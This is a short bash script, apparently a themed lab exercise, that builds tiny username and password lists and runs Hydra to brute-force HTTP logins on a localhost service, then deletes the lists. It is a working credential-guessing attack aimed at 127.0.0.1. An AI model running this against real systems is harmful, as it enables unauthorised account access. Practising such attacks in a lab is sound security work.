#!/bin/bash
# .hack System CC - Module 05: Macabre Guild Credential Spraying

TARGET_IP="127.0.0.1"
PORT="8080"

echo "=========================================================="
echo " [!] Initiating Macabre Guild Credential Simulation..."
echo "=========================================================="

# Create temporary wordlists for testing
cat << 'WORDLIST' > users.txt
admin
system_cc
guest
altimit_adm
WORDLIST

cat << 'WORDLIST' > pass.txt
123456
password
admin123
hacked_world
WORDLIST

echo "[+] Launching Hydra against System CC Gateway HTTP endpoints..."
hydra -L users.txt -P pass.txt -s $PORT $TARGET_IP http-get / -V -t 4 -o hydra_results.txt

# Clean up wordlists
rm users.txt pass.txt

echo -e "\n[+] Attack completed. Output logged to hydra_results.txt."
